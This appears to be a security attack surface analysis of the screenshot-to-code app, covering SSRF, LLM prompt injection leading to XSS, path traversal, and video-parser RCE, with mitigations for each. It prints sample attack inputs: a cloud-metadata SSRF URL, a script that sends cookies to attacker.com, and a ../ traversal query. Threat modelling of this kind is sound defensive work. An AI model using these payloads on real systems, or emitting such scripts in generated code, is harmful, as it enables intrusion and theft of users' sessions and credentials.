Here is the updated attack surface analysis for the `screenshot-to-code` application.

### Key Attack Surface List

*   **Description**
    An attacker can abuse the screenshot feature to make the backend server request arbitrary URLs, including those on the internal network or cloud provider metadata services. The endpoint `/api/screenshot` in `backend/routes/screenshot.py` takes a user-provided URL and passes it to an external screenshot service. The URL validation in the `normalize_url` function is insufficient as it does not prevent requests to internal IP addresses or local services.
*   **How screenshot-to-code contributes to the attack surface**
    The application introduces this attack surface by providing a feature to screenshot a website from a URL. The backend acts as a proxy, taking the URL from the user and initiating the screenshot process, creating a classic Server-Side Request Forgery (SSRF) vector.
*   **Example**
    An attacker sends a POST request to the `/api/screenshot` endpoint with a malicious URL targeting a cloud metadata service, such as `{"url": "http://169.254.169.254/latest/meta-data/"}` or an internal service like `{"url": "http://localhost:8000/debug"}`. The backend service will request this URL via the `screenshotone.com` API, potentially capturing sensitive information in the resulting "screenshot" or interacting with internal-only services.
*   **Impact**
    Successful exploitation could lead to the disclosure of sensitive information from the server's internal network, discovery and interaction with internal services, or theft of cloud infrastructure credentials.
*   **Risk Severity**
    High
*   **Current Mitigations**
    The `normalize_url` function, as shown in `backend/tests/test_screenshot.py`, blocks some protocols like `file://` and `ftp://`, which is a partial mitigation. However, the same tests confirm that it explicitly allows requests to `localhost` and raw IP addresses, meaning it is not an effective security control against the primary SSRF risks. This does not reduce the risk severity.
*   **Missing Mitigations**
    The backend must implement strict URL validation. This should include:
    *   An allowlist for permitted domains if possible.
    *   A denylist for private and reserved IP address ranges (e.g., `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.1`, `169.254.169.254`).
    *   Resolving the domain name in the URL and checking the resulting IP address against the denylist.

*   **Description**
    An attacker can craft a malicious prompt (either through text or by embedding instructions in an image/video) that tricks the Large Language Model (LLM) into generating code containing a malicious payload, such as a Cross-Site Scripting (XSS) script. When the victim previews this generated code, the script executes in their browser.
*   **How screenshot-to-code contributes to the attack surface**
    The application's core purpose is to accept untrusted user input (images, text, videos) and use it to generate executable code (HTML, JS) that is then rendered in a browser preview. This creates a direct path for an attacker to inject malicious client-side code.
*   **Example**
    A user provides a text prompt like: "Create a login form, and also add this script to the page: `<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>`". The LLM, focused on fulfilling the user's request, may include this malicious script in the generated HTML. When the user previews the code, their browser executes the script, sending their cookies to the attacker's server.
*   **Impact**
    Execution of arbitrary JavaScript in the context of the user's browser session. This can lead to session hijacking, credential theft, or performing actions on behalf of the user within the application.
*   **Risk Severity**
    High
*   **Current Mitigations**
    The system prompts provided to the LLMs attempt to constrain the output to only code. However, prompt engineering is not a reliable security defense against determined prompt injection attacks. The risk remains high.
*   **Missing Mitigations**
    *   Render the generated code preview inside a sandboxed `iframe` with a restrictive `sandbox` attribute (e.g., `sandbox="allow-scripts"` but without `allow-same-origin`).
    *   Implement a strong Content Security Policy (CSP) for the page that hosts the preview to limit where scripts can be loaded from and what actions they can perform.
    *   Warn users about the risks of running code generated from untrusted sources.

*   **Description**
    The backend exposes several API endpoints for developer evaluations (e.g., `/evals`, `/pairwise-evals`) that accept a `folder` path from the user as a query parameter. The application uses this parameter to construct a path to read files from the server's filesystem. There is no sanitization to prevent directory traversal sequences (`../`), allowing an attacker to read arbitrary files.
*   **How screenshot-to-code contributes to the attack surface**
    This vulnerability is introduced in `backend/routes/evals.py`, where user-controlled input is directly used in file system operations without proper validation, creating a path traversal vulnerability.
*   **Example**
    An attacker sends a GET request to `/evals?folder=../../..`. The server would then attempt to list files and read their contents from a directory three levels above the intended one, potentially exposing the entire project's source code, environment files with API keys, or sensitive system files like `/etc/passwd`.
*   **Impact**
    Arbitrary file read on the server. This can lead to the exposure of all application source code, credentials (API keys in `.env`), and sensitive operating system files.
*   **Risk Severity**
    High
*   **Current Mitigations**
    There are no apparent mitigations in the code. The user-provided path is used directly in filesystem operations.
*   **Missing Mitigations**
    *   Sanitize the `folder` parameter to remove any path traversal characters.
    *   After joining the user-provided path with the base directory (`EVALS_DIR`), resolve the absolute path and verify that it is still within the intended base directory.
    *   These developer-focused endpoints should be disabled by default in production environments, for instance by checking an environment variable like `IS_PROD`.

*   **Description**
    An attacker can upload a specially crafted video file that exploits a vulnerability in the server-side video processing library (`moviepy` or its underlying dependency, `ffmpeg`). This can lead to arbitrary code execution on the backend server.
*   **How screenshot-to-code contributes to the attack surface**
    The application introduces a `video` input mode, with processing logic in `backend/video/utils.py`. This code decodes a user-provided base64 video string, writes it to a temporary file on the server's filesystem, and processes it with the `VideoFileClip` function. This interaction with a complex file format using a powerful external library is a classic vector for remote code execution (RCE).
*   **Example**
    An attacker crafts a malicious video file (e.g., `.mp4`) that triggers a known buffer overflow or command injection vulnerability in the version of `ffmpeg` used by `moviepy`. They encode this file as a base64 data URL and submit it to the application. When the backend processes the video to extract frames, the exploit is triggered, and the attacker's shellcode executes on the server.
*   **Impact**
    Full remote code execution on the backend server. This can lead to a complete compromise of the application, its data, any stored secrets, and potentially allow the attacker to pivot to other systems within the hosting environment.
*   **Risk Severity**
    Critical
*   **Current Mitigations**
    There are no apparent mitigations. The untrusted video data is decoded and passed directly to the processing library.
*   **Missing Mitigations**
    *   Run the video processing in a highly isolated, sandboxed environment (e.g., a separate, short-lived container with minimal privileges, no secrets, and no network access).
    *   Use a file validation library to check the video's structure and properties before passing it to `moviepy`. Reject any malformed files.
    *   Implement strict resource constraints (CPU, memory, execution time) on the video processing task to mitigate Denial of Service (DoS) attacks from "video bombs" (files designed to exhaust server resources).
